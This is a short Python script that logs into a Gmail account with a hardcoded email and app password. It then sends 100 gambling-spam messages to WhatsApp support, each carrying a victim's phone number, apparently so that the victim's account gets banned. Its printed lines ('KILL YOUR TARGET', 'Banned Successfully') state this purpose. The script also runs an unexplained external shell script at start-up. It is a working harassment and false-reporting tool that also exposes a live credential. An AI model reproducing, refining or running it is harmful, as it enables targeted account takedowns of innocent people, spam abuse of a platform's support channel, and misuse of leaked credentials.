import smtplib
from email.mime.text import MIMEText
import time
import os

os.system("bash whynfx.sh")
print ("WELCOME ANONYMOUS KILL YOUR TARGET !")
EMAIL = "dyrothmvp96@gmail.com"
PASSWORD = "wdix mqoo kvbf ebbb"
TO_EMAIL = "smb@support.whatsapp.com"

# Minta nomor WA dari terminal
nomor = input("This is Banned Black Hat !(example: 62xxxxx): ")

SUBJECT = "SLOT 88 🔥🔥🔥"
BODY = f"""🔥 EXPERIENCE UNLIMITED WINS AT SLOT88 🔥

🎰 Discover the ultimate thrill of slot gaming with unmatched rewards and excitement at SLOT88!

💎 Why choose SLOT88?

✅ High RTP (over 98%) to increase your chances of winning big!
✅ Daily rewards, cashback offers, and exclusive jackpots.
✅ Secure and fast deposits starting from only $1!
✅ Withdraw your winnings instantly to your account or wallet.
✅ Mobile, tablet, and desktop support – play anywhere, anytime!

🌟 Smooth user interface, top-tier graphics, and immersive sound.

🛡️ 100% fair and transparent system with 24/7 customer support.

🚀 Join SLOT88 today and start your journey to MAXWIN every single day!

👉 Register now: https://susunaaa.pages.dev/amp, contact us on WhatsApp number:{nomor}"""

JUMLAH_KIRIM = 100
DELAY = 8

server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(EMAIL, PASSWORD)

for i in range(JUMLAH_KIRIM):
    msg = MIMEText(BODY)
    msg['Subject'] = SUBJECT
    msg['From'] = EMAIL
    msg['To'] = TO_EMAIL
    
    server.send_message(msg)
    print(f"[{i+1}] MEMULAI ACCESS CRASH BY WHYNFX {nomor}")
    time.sleep(DELAY)

server.quit()
print("Banned Successfully by BBH, Crazyy Bro....")
